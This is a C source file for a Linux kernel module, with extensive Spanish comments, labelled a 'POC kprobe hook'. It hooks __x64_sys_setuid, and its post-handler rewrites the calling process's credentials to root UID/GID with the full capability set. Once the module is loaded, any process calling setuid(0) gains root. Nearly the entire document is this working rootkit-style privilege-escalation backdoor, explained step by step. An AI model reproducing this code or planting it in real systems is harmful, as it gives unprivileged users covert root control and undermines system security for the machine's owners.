/*
 * ================================================================
 *                   PROCESO PRÁCTICO DEL KPROBE
 * ================================================================
 *
 * Carga del módulo:
 *   Cuando cargas el módulo del kernel (por ejemplo, usando "insmod kp_hook.ko"),
 *   se ejecuta la función de inicialización del módulo. En esta función se llama a
 *   register_kprobe() para registrar un kprobe que se engancha a la función interna
 *   del kernel __x64_sys_setuid. Esto significa que el kernel ahora “sabe” que cada
 *   vez que se ejecute __x64_sys_setuid (la función que se invoca cuando un proceso
 *   llama a setuid), debe llamar también a nuestro post-handler.
 *
 * Ejecución del sistema:
 *   Imagina que un proceso (por ejemplo, el programa de prueba en main.cpp) invoca
 *   setuid(0) para intentar cambiar su UID a 0. Normalmente, si el proceso no tiene
 *   permisos suficientes, la llamada fallaría. Sin embargo, en este caso, cuando se
 *   invoca setuid(0), el kernel ejecuta la función __x64_sys_setuid.
 *
 * Intercepción por el kprobe:
 *   Debido a que se ha registrado un kprobe sobre __x64_sys_setuid, justo después de
 *   que la función original se ejecuta (es decir, en el momento de retorno), el kernel
 *   llama a nuestro post-handler definido en el módulo. Este post-handler es una
 *   función diseñada para recibir el contexto del kprobe (incluyendo la estructura de
 *   registros del proceso) y realizar acciones adicionales.
 *
 * Acción del post-handler:
 *   En el post-handler, lo que se hace es preparar unas nuevas credenciales para el
 *   proceso (llamando a prepare_creds()), y luego modificar esos valores: se cambia el
 *   UID, EUID, SUID y FSUID a 0, y se hacen cambios similares en los identificadores de
 *   grupo y capacidades. Finalmente, se aplican estas nuevas credenciales con commit_creds().
 *   Prácticamente, lo que ocurre es que, a pesar de que el proceso intentó cambiar su UID
 *   a 0 (posiblemente sin privilegios), el post-handler “fuerza” el cambio, elevando el
 *   proceso a privilegios de root.
 *
 * Resultado:
 *   El proceso que llamó a setuid(0) ahora se encuentra con privilegios de root.
 *   Cuando el programa de usuario vuelve a consultar su UID (por ejemplo, usando getuid()),
 *   el valor es 0, demostrando que la intervención del kprobe tuvo efecto.
 *
 * Descarga del módulo:
 *   Cuando ya no necesites el módulo, puedes descargarlo con "rmmod kp_hook.ko".
 *   En ese momento, se llama a la función de salida, que desregistra el kprobe mediante
 *   unregister_kprobe(), removiendo la interceptación y restaurando el comportamiento
 *   normal del kernel.
 *
 * En resumen, el proceso práctico del kprobe en este ejemplo es:
 *
 *   - Registro: Se instala un kprobe sobre la función __x64_sys_setuid.
 *   - Intercepción: Cada vez que se llama a setuid, el kprobe intercepta la ejecución y,
 *     tras el retorno de la función original, ejecuta el post-handler.
 *   - Modificación: El post-handler modifica las credenciales del proceso, elevando sus
 *     privilegios a root.
 *   - Restauración: Cuando se descarga el módulo, el kprobe se desregistra y se elimina la
 *     intervención.
 *
 * ================================================================
 */

#include <linux/kernel.h>      // Funciones y macros esenciales del kernel, como printk()
#include <linux/module.h>      // Funciones para cargar y descargar módulos (module_init, module_exit)
#include <linux/init.h>        // Macros para la inicialización y finalización del módulo
#include <linux/atomic.h>      // Permite el uso de variables atómicas para manejo seguro de estados compartidos
#include <linux/kprobes.h>     // Proporciona la API para registrar y gestionar kprobes
#include <linux/sched.h>       // Acceso a estructuras de procesos (por ejemplo, para obtener credenciales)
#include <linux/capability.h>  // Definiciones para manipular las capacidades de los procesos

// Información del módulo, necesaria para su correcta carga y verificación en el kernel
MODULE_AUTHOR("humzak711");
MODULE_DESCRIPTION("POC kprobe hook");
MODULE_LICENSE("GPL");

// Variable atómica para llevar un registro de si el kprobe se ha registrado correctamente
atomic_t hooked = ATOMIC_INIT(0);

// Definiciones para facilitar la asignación de privilegios
// Aunque se define MAGIC_UID, en este ejemplo no se utiliza directamente
#define MAGIC_UID 50

// Definiciones para elevar privilegios: root en Linux tiene UID y GID igual a 0
#define _GLOBAL_ROOT_UID 0
#define _GLOBAL_ROOT_GID 0

/*
 * Función post-handler del kprobe.
 * Esta función se ejecuta justo después de que se llame a la función original interceptada,
 * en este caso __x64_sys_setuid.
 */
void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs,
                                     unsigned long flags)
{
    // Imprime un mensaje en el log del kernel indicando que se ha activado el hook.
    printk(KERN_INFO "setuid hook called, elevating privs...\n");

    // Prepara una copia modificable de las credenciales actuales del proceso
    struct cred *new_creds = prepare_creds();

    // --------------------------
    // Elevación de privilegios (UID)
    // Se asigna el valor 0 a los diferentes identificadores de usuario:
    // uid: Identificador real del usuario.
    // euid: Identificador efectivo (utilizado para permisos en operaciones).
    // suid: Identificador guardado (para reestablecer privilegios en ciertos casos).
    // fsuid: Identificador usado para el acceso a archivos.
    // --------------------------
    new_creds->uid.val   = _GLOBAL_ROOT_UID;
    new_creds->euid.val  = _GLOBAL_ROOT_UID;
    new_creds->suid.val  = _GLOBAL_ROOT_UID;
    new_creds->fsuid.val = _GLOBAL_ROOT_UID;

    // --------------------------
    // Elevación de privilegios (GID)
    // Se realiza un proceso similar para los identificadores de grupo:
    // gid: Grupo real.
    // egid: Grupo efectivo.
    // sgid: Grupo guardado.
    // fsgid: Grupo utilizado para el acceso a archivos.
    // --------------------------
    new_creds->gid.val   = _GLOBAL_ROOT_GID;
    new_creds->egid.val  = _GLOBAL_ROOT_GID;
    new_creds->sgid.val  = _GLOBAL_ROOT_GID;
    new_creds->fsgid.val = _GLOBAL_ROOT_GID;

    // --------------------------
    // Elevación de privilegios (Capacidades)
    // Asigna el conjunto completo de capacidades, lo que permite al proceso realizar cualquier acción privilegiada.
    // CAP_FULL_SET es una macro que representa todas las capacidades posibles.
    // --------------------------
    new_creds->cap_inheritable = CAP_FULL_SET;
    new_creds->cap_permitted   = CAP_FULL_SET;
    new_creds->cap_effective   = CAP_FULL_SET;
    new_creds->cap_bset        = CAP_FULL_SET;

    // Aplica las nuevas credenciales al proceso, efectivamente elevando sus privilegios a los de root.
    commit_creds(new_creds);
}

/*
 * Declaración y configuración del kprobe.
 * Aquí se define la estructura 'struct kprobe' que indica a qué función del kernel se engancha,
 * en este caso, la función interna __x64_sys_setuid, y se asigna el post-handler que se ejecutará.
 */
struct kprobe __x64_sys_setuid_hook = {
    .symbol_name = "__x64_sys_setuid",               // Nombre del símbolo del kernel a interceptar.
    .post_handler = __x64_sys_setuid_post_handler,     // Función a ejecutar después de la llamada original.
};

/*
 * Función de inicialización del módulo (se ejecuta al cargar el módulo).
 */
static int __init rkin(void)
{
    printk(KERN_INFO "module loaded\n");

    // Registra el kprobe. Si 'register_kprobe' retorna un valor negativo, hubo error.
    int registered = register_kprobe(&__x64_sys_setuid_hook);
    if (registered < 0)
    {
          printk(KERN_INFO "failed to register kprobe\n");
    }
    else
    {
          // Si se registra correctamente, se incrementa la variable 'hooked' para indicar que el hook está activo.
          printk(KERN_INFO "hooked\n");
          atomic_inc(&hooked);
    }

    return 0; // Retorna 0 para indicar que la inicialización fue exitosa.
}

/*
 * Función de finalización del módulo (se ejecuta al descargar el módulo).
 */
static void __exit rkout(void)
{
    // Verifica si el kprobe estaba registrado (valor atómico mayor a 0)
    if (atomic_read(&hooked))
    {
          // Si estaba registrado, se desregistra el kprobe para restaurar el comportamiento original.
          unregister_kprobe(&__x64_sys_setuid_hook);
          printk(KERN_INFO "unhooked\n");
    }
}

// Macros que indican las funciones de inicialización y finalización del módulo.
module_init(rkin);
module_exit(rkout);
